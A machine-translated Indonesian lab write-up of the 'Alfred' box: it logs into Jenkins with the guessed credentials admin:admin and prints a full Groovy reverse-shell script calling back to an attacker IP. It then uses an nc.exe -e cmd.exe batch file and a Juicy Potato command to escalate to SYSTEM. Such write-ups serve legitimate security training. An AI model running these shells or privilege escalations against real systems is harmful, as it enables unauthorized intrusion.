---
title: "Alfred"
description: "Enum Nmap: Port 8080 Jenkins kita bisa login menggunakan tebakan kata sandi, saya coba admin:admin dan berhasil. Eksploitasi Jenkins masuk ke konsol skrip, konsol ini memungkinkan pengguna untuk menjalankan"
lang: "id"
translationKey: "alfred"
category: "lab-writeups"
tags: ["Lab", "Juicy Potato", "jenkins-revshell", "Windows"]
publishDate: "2024-12-15"
draft: false
featured: false
sample: false
author: "Dimas Sahid Abdullah"
translationStatus: "machine"
sourceLang: "en"
notionId: "15d5fca1-ed80-803f-b8a0-fd922ad09741"
notionUrl: "https://app.notion.com/p/Alfred-15d5fca1ed80803fb8a0fd922ad09741"
notionLastEdited: "2025-06-11T22:39:00.000Z"
---

# Enum

Nmap:

![](/images/alfred/9abd459da010.png)

# Port 8080 (Jenkins)

![](/images/alfred/40db82896a47.png)

Kita bisa masuk menggunakan tebakan kata sandi, saya coba `admin:admin` dan berhasil

![](/images/alfred/55ad82e718e4.png)

### Manfaatkan Jenkins

Buka **konsol skrip**. Konsol ini memungkinkan pengguna untuk menjalankan perintah untuk otomatisasi dan pelaporan.
menggunakan skrip groovy. Dengan mengeksploitasi hak istimewa ini, penyerang dapat menggunakan [revsh.groovy](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) untuk mendapatkan sesi shell terbalik kembali ke mesin penyerang.

![](/images/alfred/56dff536052d.png)

revsh.groovy :

```bash
String host=”10.9.4.211”;
int port=8044;
String cmd=”cmd.exe”;
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Jalankan skrip dari konsol Groovy dan sesi bash akan terhubung ke pendengar Netcat. Penyerang sekarang dapat menjalankan perintah sebagai pengguna Jenkins.

![](/images/alfred/342b00588264.png)

### Kirim Bendera user.txt

![](/images/alfred/b59a87dd2de3.png)

## Winpriv

jalankan perintah `whoami /priv` untuk memeriksa hak akses pengguna kami

![](/images/alfred/9ac2d1aba2c5.png)

Kita melihat bahwa kita memiliki **SeImpersonatePrivilege**, mari kita gunakan salah satu serangan kentang untuk melakukan hak akses.

### Eksploitasi Kentang Lezat

![](/images/alfred/5e25bd0bbcad.png)

Membuat file batch untuk mendapatkan akses shell di mesin kita.

```bash
echo "C:\Users\bruce\nc.exe" -e cmd.exe 10.9.4.211 9186 > priv.bat
```

![](/images/alfred/9b5ead47206f.png)

Melakukan serangan kentang dan mendapatkan reverse shell menggunakan netcat.

`{03ca98d6-ff5d-49b8-abc6-03dd84127020}` - CLSID, lebih banyak lagi di [CLSID](http://ohpe.it/juicy-potato/CLSID/Windows_7_Enterprise/)

```bash
jp.exe -p "C:\Users\bruce\priv.bat" -l 9186 -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
```

![](/images/alfred/7ec50c2a9ab8.png)

![](/images/alfred/c7cb422263c5.png)
